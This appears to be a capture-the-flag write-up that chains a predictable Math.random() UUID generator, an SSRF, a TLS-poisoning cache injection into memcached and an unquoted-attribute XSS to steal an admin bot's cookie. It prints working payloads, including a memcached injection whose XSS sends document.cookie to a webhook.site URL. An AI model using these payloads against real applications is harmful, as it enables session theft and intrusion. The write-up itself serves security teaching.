## What do we need?


### Insecure random

The application uses the "lil-uuid" library to generate the UUIDs.
This library is unsafe because it uses Math.random() to get the random values, as you can see in this snippet of code.

```js
  function uuid() {
    var uuid = '', i, random
    for (i = 0; i < 32; i++) {
      random = Math.random() * 16 | 0;
      if (i === 8 || i === 12 || i === 16 || i === 20) uuid += '-'
      uuid += (i === 12 ? 4 : (i === 16 ? (random & 3 | 8) : random)).toString(16)
    }
    return uuid
  }
```

Using this problem we can predict the generated UUIDs


### SSRF

The "import template" functionality asks the user for a URL and uses it to fetch the URL page server side.

### TLS poisoning

A cool attack that exploits the session persistence feature of TLS to turn an SSRF into a flexible attack to internal services.

This can be used to send arbitrary commands to the cache used by the application.

You can read more information about this attack and find the implementation [here](https://github.com/jmdx/TLS-poison).

### XSS

The template file "check_request.ejs" is vulnerable to XSS if you can control the base64 image saved in the cache.

This is the vulnerable part of the template:
```
<img src=data:image/png;base64,<%= request.img %>>
```

The template engine automatically escapes the dangerous characters in the img variable.
However, you don't need any special character because the src attribute isn't contained inside quotes.

Indeed, the following payload in the img variable will execute an alert:
```
aaa onerror=alert(1)
```

### Infoleak

I don't believe this is strictly necessary, however, it's useful to obtain the IP address of the memcached docker.
You can do this with the "import template" functionality by requiring the server to fetch the "http://cache/" URL.
This should return an error similar to 
```
FetchError: request to http://cache/ failed, reason: connect ECONNREFUSED 172.28.0.2:80
```
leaking the IP address of the memcached docker.




## Let's put it all together

We need to perform the following steps:

- Find the UUID of a premium request (the application doesn't leak it to the user)
- Use the TLS poison attack to change the value of a premium request in the cache to our XSS payload that leaks the flag
- Ask the admin to visit our request 
- Wait for the flag :)


### Find the UUIDs of our request

We can leak some UUIDs generated by the vulnerable library by registering a new user.
The user_id will be inside the JWT cookie signed by the server after logging in with the new user.

Our exploit uses two UUIDs to retrieve the random seed and an additional UUID to confirm the retrieved value.

You can use the `get_uuids.py` script to register 3 users and create the premium request that will be exploited.

You can use the UUIDs to break the PRNG and retrieve the seed used. 
Pay attention to take into consideration all the `Math.random()` calls done by the server in the requests performed by the python scripts, because some of the library used in the server also calls the `Math.random()` function.

You can use the 2 UUIDs to break the random and the third one to check the correctness of your computations.
With this approach, you are able to compute and confirm the id of the generated request.


### Cache injection

You can use the [TLS poison implementation](https://github.com/jmdx/TLS-poison) to inject some data into the cache.

I injected the following payload:
```
\r\n\r\nset message_LEAKEDREQUESTID 0 0 120\r\n{\"msg\":\"test\",\"img\":\"aaa onerror=location=`https://webhook.site/527ed3bf-e37d-4e79-8643-0ed36e1869af?`+document.cookie\"}\r\n\r\n
```

This payload will trigger the XSS and leak the bot token to a webhook.

After setting up the exploit server you can use the SSRF to trigger the exploit.

### Exploit the XSS

After injecting the cache, you can log in the account generated by the python script and make the admin bot visit your request with the XSS payload.


If everything went smoothly you will find the admin cookie in your webhook. You can use it to retrieve the flag.

